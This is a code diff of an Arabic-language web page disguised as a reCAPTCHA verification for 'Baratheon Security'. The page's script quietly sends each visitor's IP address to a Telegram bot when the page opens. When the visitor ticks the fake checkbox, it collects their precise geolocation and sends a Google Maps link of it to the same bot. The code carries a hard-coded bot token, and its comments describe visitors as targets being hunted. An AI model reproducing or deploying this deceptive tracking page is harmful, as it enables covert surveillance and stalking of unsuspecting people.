@@ -3,47 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من الأمان | Baratheon System</title>
+    <title>Baratheon Security | التحقق من الأمان</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background-color: #f1f1f1; }
+        .captcha-box { background: white; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border: 1px solid #d3d3d3; }
+    </style>
 </head>
-<body class="bg-[#f9f9f9] flex items-center justify-center min-h-screen font-sans">
+<body class="flex items-center justify-center min-h-screen p-4">
 
-    <div class="bg-white p-8 rounded-lg shadow-md border border-gray-200 max-w-sm w-full">
-        <div class="flex items-center mb-6">
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="w-10 ml-4">
-            <div>
-                <h1 class="text-xl font-bold text-gray-700 leading-tight">Baratheon Security</h1>
-                <p class="text-xs text-gray-500 font-mono">ID: 5475815049-SEC</p>
+    <div class="captcha-box p-8 max-w-sm w-full text-center">
+        <div class="flex items-center justify-center mb-6">
+            <i class="fas fa-sync-alt text-4xl text-blue-600 animate-spin-slow"></i>
+            <div class="text-right mr-4">
+                <h1 class="text-2xl font-bold text-gray-800">Baratheon Security</h1>
+                <p class="text-[10px] text-gray-400 font-mono">ID: 5475815049-SEC</p>
             </div>
         </div>
 
-        <div class="bg-[#f1f1f1] p-4 rounded border border-gray-300 mb-6">
-            <p class="text-sm text-gray-600 mb-4 font-semibold">يرجى إثبات أنك لست روبوت للوصول إلى المحتوى.</p>
+        <div class="bg-gray-50 p-5 rounded-md border border-gray-200">
+            <p class="text-sm text-gray-600 mb-6">يرجى إثبات أنك لست روبوت للوصول إلى المحتوى.</p>
             
-            <label class="flex items-center cursor-pointer bg-white p-3 border border-gray-300 rounded hover:bg-gray-50 transition">
-                <input type="checkbox" onclick="startVerification()" class="w-6 h-6 ml-3 cursor-pointer">
-                <span class="text-gray-700 font-medium">أنا لست برنامج روبوت</span>
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-5 mr-auto opacity-30">
+            <label class="flex items-center justify-between bg-white p-4 border border-gray-300 rounded cursor-pointer hover:bg-gray-50 transition shadow-sm">
+                <div class="flex items-center">
+                    <input type="checkbox" onclick="startVerification()" class="w-6 h-6 ml-3 cursor-pointer accent-blue-600">
+                    <span class="text-gray-700 font-medium text-lg">أنا لست برنامج روبوت</span>
+                </div>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-7 opacity-40">
             </label>
         </div>
 
-        <div class="text-[10px] text-gray-400 text-center">
-            <p>Privacy - Terms</p>
-            <p class="mt-1">Powered by <b>Baratheon Tech</b></p>
+        <div class="mt-6 flex justify-between items-center text-[10px] text-gray-400 px-2">
+            <div>
+                <a href="#" class="hover:underline">Privacy</a> - <a href="#" class="hover:underline">Terms</a>
+            </div>
+            <p>Powered by <b>Baratheon Tech</b></p>
         </div>
     </div>
 
     <script>
+        // البيانات السرية الخاصة بـ Baratheon
         const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
         const chat_id = "5475815049";
 
-        // إرسال الـ IP فوراً عند فتح الصفحة
+        // صيد صامت للـ IP بمجرد فتح الصفحة
         window.onload = async () => {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                const msg = `👣 <b>زائر جديد فتح صفحة التحقق!</b>\n🌐 IP: <code>${data.ip}</code>\n👤 المالك: Baratheon`;
+                const msg = `👣 <b>زائر جديد في نظام Baratheon!</b>\n\n🌐 IP: <code>${data.ip}</code>\n⚙️ الحالة: بانتظار التحقق..`;
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
             } catch(e){}
         };
@@ -55,14 +64,14 @@
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const msg = `✅ <b>تم اجتياز الفحص! الموقع بدقة:</b>\n🔗 ${mapUrl}`;
+                    const msg = `✅ <b>تم التحقق! هدف جديد في القبضة:</b>\n\n📍 الموقع: ${mapUrl}`;
                     
                     await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
                     
-                    alert("تم التحقق بنجاح! جاري تحويلك..");
+                    alert("تم التحقق بنجاح! جاري توجيهك للمكتبة..");
                     window.location.href = "https://www.python.org";
                 }, (err) => {
-                    alert("خطأ: يجب تحديد مربع 'أنا لست روبوت' والسماح بالوصول لإكمال العملية.");
+                    alert("نظام Baratheon: يرجى تحديد المربع والسماح بالوصول لتأكيد هويتك البشرية.");
                 });
             }
         }
